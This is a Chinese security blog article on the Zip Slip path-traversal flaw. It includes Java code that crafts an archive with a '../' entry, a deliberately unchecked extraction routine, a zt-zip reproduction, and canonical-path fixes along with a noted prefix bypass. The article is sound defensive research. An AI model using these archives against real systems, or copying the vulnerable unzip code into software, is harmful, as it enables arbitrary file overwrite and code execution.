***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ** ***本文原创作者：路上路人路过，本文属FreeBuf原创奖励计划，未经许可禁止转载。**  
**

 **Zip Slip是一个广泛存在的任意文件覆盖漏洞，通常会导致远程命令执行。**

该漏洞影响范围极大：

1.受影响的产品：惠普、Amazon、apache、Pivotal等；

2.受影响的编程语言：JavaScript、Python、Ruby、.NET、Go、Groovy等；

3.受影响的压缩文件类型：tar、jar、war、cpio、apk、rar、7z等。

zip
slip漏洞其实也是目录遍历的一种，通过应用程序解压恶意的压缩文件来进行攻击。恶意攻击者通过构造一个压缩文件条目中带有../的压缩文件，上传后交给应用程序进行解压，由于程序解压时没有对文件名进行合法性的校验，而是直接将文件名拼接在待解压目录后面，导致可以将文件解压到正常解压缩路径之外并覆盖可执行文件，从而等待系统或用户调用他们实现代码执行（也可能是覆盖配置文件或其他敏感文件）。

目前只要是使用存在Zip Slip漏洞的库，且没有进行目录遍历验证的程序或直接包含易受攻击代码的程序都将受此漏洞影响。如下是受影响的库：

![图片.png](https://image.3001.net/images/20180809/1533799000_5b6bea583e36a.png!small)

也可以直接查看GitHub项目：<https://github.com/snyk/zip-slip-vulnerability>

接下来通过java代码对zip slip漏洞进行复现：

如下图所示，主目录zip_slip下有test和test1两个文件夹，test文件夹下是一个恶意的zip压缩文件，test1是test.txt文件，如果应用程序对该恶意zip压缩文件进行解压后会覆盖test1下的test.txt（该test.txt中内容是good！！）文件，说明该应用程序存在zip
slip漏洞。

![图片.png](https://image.3001.net/images/20180809/1533799029_5b6bea75ef770.png!small)

![图片.png](https://image.3001.net/images/20180809/1533799069_5b6bea9dbadeb.png!small)

由于windows上不能直接构造带有../条目的压缩文件，所以需要使用程序来构造evil.zip这样的恶意压缩包。

![图片.png](https://image.3001.net/images/20180809/1533799079_5b6beaa714c1f.png!small)

利用如下程序对test.txt（实际场景中该txt文件是恶意代码，用于覆盖）进行压缩为evil.zip

    
    
    public class Enzip {  
    public static void main(String[] args) {  
    // TODO Auto-generated method stub  
     //第一个参数是需要压缩的源路径；第二个参数是压缩文件的目的路径，这边需要将压缩的文件名字加上去  
     compress("C:/Users/DELL/Desktop/zip_slip/test/test.txt","C:/Users/DELL/Desktop/zip_slip/test/evil.zip");  
     }  
    /**  
     * 压缩文件  
     * @param srcFilePath 压缩源路径  
     * @param destFilePath 压缩目的路径  
     */  
     public static void compress(String srcFilePath, String destFilePath) {  
            File src = new File(srcFilePath);  
     if (!src.exists()) {  
    throw new RuntimeException(srcFilePath + "不存在");  
     }  
            File zipFile = new File(destFilePath);  
     try {  
                FileOutputStream fos = new FileOutputStream(zipFile);  
     ZipOutputStream zos = new ZipOutputStream(fos);  
     String baseDir = "../test1/";  
     compressFile(src, zos, baseDir);  
     //compressbyType(src, zos, baseDir);  
     zos.close();  
     } catch (Exception e) {  
    // TODO Auto-generated catch block  
     e.printStackTrace();  
     }  
        }  
    /**  
     * 按照原路径的类型就行压缩。文件路径直接把文件压缩，  
     * @param src  
     * @param zos  
     * @param baseDir  
     */  
     private static void compressbyType(File src, ZipOutputStream zos,String baseDir) {  
    if (!src.exists())  
    return;  
     System.out.println("压缩路径" + baseDir + src.getName());  
     compressFile(src, zos, baseDir);  
     }  
    /**  
     * 压缩文件  
     */  
     private static void compressFile(File file, ZipOutputStream zos,String baseDir) {  
    if (!file.exists())  
    return;  
     try {  
                BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));  
     ZipEntry entry = new ZipEntry(baseDir + file.getName());  
     zos.putNextEntry(entry);  
     int count;  
     byte[] buf = new byte[1024];  
     while ((count = bis.read(buf)) != -1) {  
                    zos.write(buf, 0, count);  
     }  
                bis.close();  
     } catch (Exception e) {  
    // TODO: handle exception  
     }  
        }  
    }

由于java中用于解压的方法很多，仅选取其中两个具有代表性的进行研究

###  **ant-1.7.0.jar（直接包含易受攻击代码）**

    
    
    public class Unzip {  
    public static void main(String[] args) throws IOException {  
    //解压zip的包  
     String fileAddress = "C:/Users/DELL/Desktop/zip_slip/test/evil.zip";  
     //zip文件解压路径  
     String unZipAddress = "C:/Users/DELL/Desktop/zip_slip/test/";  
     //去目录下寻找文件  
     File file = new File(fileAddress);  
     ZipFile zipFile = null;  
     try {  
                zipFile = new ZipFile(file,"GBK");//设置编码格式  
     } catch (IOException exception) {  
                exception.printStackTrace();  
     System.out.println("解压文件不存在!");  
     }  
            Enumeration e = zipFile.getEntries();  
     while(e.hasMoreElements()) {  
                ZipEntry zipEntry = (ZipEntry)e.nextElement();  
     System.out.println(zipEntry.getName());  
     File f = new File(unZipAddress + zipEntry.getName());  
     f.getParentFile().mkdirs();  
     f.createNewFile();  
     InputStream is = zipFile.getInputStream(zipEntry);  
     FileOutputStream fos = new FileOutputStream(f);  
     int length = 0;  
     byte[] b = new byte[1024];  
     while((length=is.read(b, 0, 1024))!=-1) {  
                        fos.write(b, 0, length);  
     }  
                    is.close();  
     fos.close();  
     }  
    if (zipFile != null) {  
                zipFile.close();  
     }  
    //file.deleteOnExit();  
     }  
    }

如上解压代码运行后对evil.zip进行解压后会覆盖text1中的test.txt文件。

![图片.png](https://image.3001.net/images/20180809/1533799092_5b6beab4d8661.png!small)

问题出在：File f = new File(unZipAddress + zipEntry.getName());

没有对zipEntry.getName()做过滤就直接和unZipAddress 进行了拼凑，可以通过在程序中将该zipEntry的文件名打出来。

![图片.png](https://image.3001.net/images/20180809/1533799100_5b6beabce426d.png!small)

###  **zt-zip-1.11.jar（存在漏洞的组件）**

    
    
    import org.zeroturnaround.zip.ZipUtil;  
    import java.io.File;  
    public class Unzip {  
    //利用zt-zip.jar进行解压  
    public static void main(String[] args) {  
        ZipUtil.unpack(new File("C:/Users/DELL/Desktop/zip_slip/test/evil.zip"), new File("C:/Users/DELL/Desktop/zip_slip/test/"));  
     }  
    }

利用zt-zip-1.11.jar对zip文件进行压缩的代码如上所示，zt-zip-1.11.jar对底层进行了封装，debug运行查看底层源码如下：

![图片.png](https://image.3001.net/images/20180809/1533799114_5b6beaca56ddf.png!small)

后面就是直接用io流写入文件了，可以看到也没有对文件名做任何的过滤。

值得注意的是：利用ZipUtil.unpack(new File(), new File());将压缩文件解压到指定目录下是是存在zip slip漏洞的

而使用ZipUtil.explode(new
File());将压缩文件解压到当前目录则不存在此漏洞，这和底层实现有关（其实也没有做过滤，只不过是直接获取当前zip的目录作为文件存放的目录）。

###  **其他**

上面说过，一般存在zip slip漏洞的有两种情况：1.直接使用存在漏洞的代码块
2.使用存在漏洞的组件。以上分别对这两种情况做了复现。除了ant.jar以及zt-zip.jar，还有ziputil.jar(直接包含缺陷代码)、zip4j.jar（存在漏洞的组件）等。

###  **修复方法：**

目前的修复方法：如果是包含有缺陷代码的，需要对文件名做过滤；如果使用了包含漏洞的jar包，应及时更新到最新的jar包。

1.先看下zt-zip-1.13这个最新包的修复效果：解压恶意压缩文件时，会报错显示加压的文件尝试跳出正常的目录之外。

![图片.png](https://image.3001.net/images/20180809/1533799168_5b6beb00737c5.png!small)

查看底层修复代码如下：

![图片.png](https://image.3001.net/images/20180809/1533799176_5b6beb0810094.png!small)

核心地方在这个if判断语句中：

    
    
    name.indexOf("..") != -1 && !file.getCanonicalPath().startsWith(this.outputDir.getCanonicalPath())

判断语句分为两部分：文件名中含有“..” 且文件名不以目录名（正常解压的目录）开头时，则让文件解压失败。

但是这里有个小问题（也是我上面复现的时候踩的一个坑），就是采用这种防护措施，恶意攻击者仍然可以将文件解压到与正常解压目录同一个层且文件夹名恰好是以正常解压目录名开头的文件夹下。也就是正常期望解压到user1文件夹下，恶意攻击者仍然可以通过构造恶意压缩文件来覆盖user11、user111、user121等等这些文件夹下的文件。不过实际运用场景中这种情况非常少见，达不到想要的攻击效果。

2.如果是直接包含了缺陷代码，也建议通过如上的修复方法对文件名做校验。

    
    
    String canonicalDestinationDirPath = destinationDir.getCanonicalPath();
    
    File destinationfile = new File(destinationDir, e.getName());
    
    String canonicalDestinationFile = destinationfile.getCanonicalPath();
    
    if (!canonicalDestinationFile.startsWith(canonicalDestinationDirPath)) {
    
    throw new ArchiverException("Entry is outside of the target dir: " + e.getName());
    
    }

 ***本文原创作者：路上路人路过，本文属FreeBuf原创奖励计划，未经许可禁止转载**

